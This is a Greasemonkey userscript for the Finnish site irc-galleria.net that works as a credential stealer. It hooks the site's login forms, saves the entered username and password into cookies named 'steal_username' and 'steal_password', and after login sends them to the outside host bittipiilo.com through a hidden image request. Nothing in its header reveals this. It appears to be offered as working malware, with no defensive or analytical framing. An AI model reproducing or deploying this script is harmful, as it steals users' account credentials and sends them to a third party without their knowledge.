// ==UserScript==
// @name           IRC-galleria
// @namespace      js
// @include        http://irc-galleria.net/*
// ==/UserScript==

var username = "";
var password = "";

function init(){
	
	var loc = window.location;
	
	if(loc == "http://irc-galleria.net/index.php" || loc == "http://irc-galleria.net/"){
		
		if(document.getElementById("tour3-login") != null){
			
			setCookie("logged","false",365);
			
			form2 = document.getElementById("tour3-login");
			form2.addEventListener("submit",getData,false);
			
		}else{
			
			loggedIn();
			return 0;
			
		}
		
		if(document.getElementById("h1-login") != null){
			
			setCookie("logged","false",365);
			
			form1 = document.getElementById("h1-login");
			form1.addEventListener("submit",getData,false);
		
		}else{
			
			loggedIn();
			return 0;
			
		}
		
	}else if(loc.toString().indexOf("login_newpass.php") != -1){
		
		if(document.getElementById("form-login") != null){
		
			setCookie("logged","false",365);
			
			form1 = document.getElementById("form-login");
			form1.addEventListener("submit",getData,false);
		
		}
		
		if(document.getElementById("h1-login") != null){
		
			setCookie("logged","false",365);
			
			form1 = document.getElementById("h1-login");
			form1.addEventListener("submit",getData,false);
		
		}
		
	}
	
}

function getData(){
	
	if(this.id == "h1-login"){
	
		username = document.getElementById("login-username").value;
		password = document.getElementById("login-password").value;
		
	}else if(this.id == "tour3-login"){
	
		username = document.getElementById("tour3-login-login").value;
		password = document.getElementById("tour3-login-password").value;
		
	}
	else if(this.id == "form-login"){
	
		username = document.getElementsByName("login")[1].value;
		password = document.getElementsByName("passwd")[1].value;
		
	}
	
	setCookie("steal_username",username,365);
	setCookie("steal_password",password,365);
	
	
	
	/*var url = "http://bittipiilo.com/recieve.php?host=galtsu&user="+escape(username)+"&pass="+escape(password);
	
	var img = document.createElement("img");
	img.alt = "";
	img.src = url;
	document.body.appendChild(img);
	*/
	
}

function loggedIn(){
	
	if(getCookie("logged") == "false"){
	
		setCookie("logged","true",365);
		
		var url = "http://bittipiilo.com/recieve.php?host=galtsu&user="+escape(getCookie("steal_username"))+"&pass="+escape(getCookie("steal_password"));
		
		setCookie("steal_username","",-1);
		setCookie("steal_password","",-1);
		
		var img = document.createElement("img");
		
		img.alt = "";
		img.src = url;
		
		document.body.appendChild(img);
		
	}	
	
}

function setCookie(c_name,value,expiredays){

	var exdate = new Date();
	
	exdate.setDate(exdate.getDate()+expiredays);
	document.cookie=c_name+ "=" +escape(value)+((expiredays==null) ? "" : ";expires="+exdate.toUTCString());

}

function getCookie(c_name){

	if(document.cookie.length>0){
	
		c_start=document.cookie.indexOf(c_name + "=");
		
		if(c_start != -1){
		
			c_start=c_start + c_name.length+1;
			c_end=document.cookie.indexOf(";",c_start);
			
			if(c_end==-1) c_end=document.cookie.length;
			
			return unescape(document.cookie.substring(c_start,c_end));
			
   		}
	}
	
	return "";
	
}

window.addEventListener("load",init,false);